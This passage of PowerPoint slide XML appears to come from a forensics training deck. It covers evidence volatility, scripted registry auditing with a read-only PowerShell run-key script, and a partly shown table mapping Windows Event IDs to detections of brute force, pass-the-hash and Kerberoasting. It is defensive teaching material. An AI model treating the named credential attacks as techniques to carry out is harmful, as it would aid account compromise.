              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Order of Volatility</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFil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Forensics Mindset &amp; Evidence Volatility (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_order_of_volatility.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RFC 3227 Order of Volatility: forensic investigators must capture the most ephemeral data first to preserve evidence that disappears at shutdown.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Forensics Mindset &amp; Evidence Volatility (3/3)</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CPU Registers &amp; Cache:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The most volatile data, lost in microseconds.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Routing Tables, ARP Cache &amp; RAM:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Active network connections, running processes, decrypted keys, and memory-only malware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Temporary File Systems:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Cached system data and swap space.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Persistent Storage (Disk):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Hard drives, SSDs, and partition tables.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Remote Monitoring Data:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Firewall logs, SIEM dashboards, and netflow data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Physical Infrastructure:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Network cables, routers, and physical topology configurations.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Scripted Log Auditing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System administrators and analysts use automated scripts to search through host logs for indicators of compromise, reducing response times.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Scripted Log Auditing (2/4)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_registry_log_audit.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Automated registry auditing: scripts systematically enumerate startup persistence locations and surface unauthorized executables for analyst review.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Scripted Log Auditing (3/4)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>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Define Audit Scope:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Identify which registry keys, Event Log channels, and startup locations require periodic inspection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Execute Queries:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Run PowerShell or WMI scripts to enumerate registry run keys, scheduled tasks (Event ID 4698), and installed services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Baseline Comparison:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Compare current values against a known-good configuration baseline captured during system provisioning.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Flag Anomalies:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Identify entries that reference unauthorized executables, unusual file paths, or unsigned binaries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Document &amp; Escalate:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Record all findings with timestamps and escalate confirmed indicators to the SOC for investigation.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Scripted Log Auditing (4/4)</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Query registry run keys for potential persistence mechanisms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>$RunKeys = @(</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>foreach ($Path in $RunKeys) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    if (Test-Path $Path) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>        Write-Output "Auditing Registry Path: $Path"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>        Get-ItemProperty -Path $Path | </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>            Select-Object -Property * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSDrive, PSProvider |</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>            Out-String</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4"/>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Windows Event Log Deep Dive, Key Event IDs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Not all Windows Event IDs carry equal forensic weight. Security analysts maintain a prioritized reference of high-signal event IDs that most reliably indicate unauthorized activity.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Windows Event Log Deep Dive, Key Event IDs (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_windows_event_ids_reference.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3575626"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="494562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High-signal Windows Event ID reference: analysts should memorize these event IDs as the first layer of host-based detection.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Windows Event Log Deep Dive, Key Event IDs (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="1330000"/>
          <a:ext cx="10555354" cy="3358944"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638840"/>
              </a:tblGrid>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Event ID</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Log</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Detection Value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4624</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Successful account logon</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Logon type 3 (network) from unusual hours or IP</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4625</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Failed account logon</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Brute-force threshold, 5+ failures per minute</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4648</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Logon using explicit credentials</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Pass-the-hash and lateral movement</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4720</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>User account created</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Unauthorized admin account creation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4732</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Member added to security-enabled local group</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Privilege escalation to Administrators group</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4768</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kerberos TGT requested (AS-REQ)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kerberoasting reconnaissance</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4769</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kerberos service ticket requested (TGS-REQ)</a:t>
